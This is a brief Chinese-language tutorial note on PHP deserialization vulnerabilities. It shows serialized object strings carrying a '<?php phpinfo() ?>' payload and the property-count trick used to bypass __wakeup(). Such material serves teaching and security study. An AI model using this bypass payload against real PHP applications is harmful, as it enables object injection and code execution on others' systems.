# PHP 反序列化漏洞

**demo01.php** 对一个类进行序列化操作

序列化结果:
```
O:1:"A":1:{s:6:"target";s:18:"<?php phpinfo() ?>";}
``` 
**demo02.php** 接收一个序列化的字符串反序列化 绕过 __wakeup() 方法:

正常传递:

```
O:1:"A":1:{s:6:"target";s:18:"<?php phpinfo() ?>";}
``` 

绕过传递:

```
O:1:"A":2:{s:6:"target";s:18:"<?php phpinfo() ?>";}
```
